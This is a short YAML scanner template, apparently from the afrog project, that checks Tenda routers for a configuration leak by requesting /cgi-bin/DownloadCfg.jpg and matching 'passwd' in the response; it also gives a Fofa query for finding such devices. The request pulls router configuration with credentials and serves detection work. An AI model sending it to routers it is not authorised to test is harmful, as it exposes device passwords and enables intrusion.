# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - passwd
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/cgi-bin/DownloadCfg.jpg'
id: tenda-downloadcfg-leak
info:
  author: zan8in
  description: 'Fofa: app="Tenda-路由器"'
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Tenda 敏感信息泄露
  severity: high
  tags: tenda,route,leak,argus-import
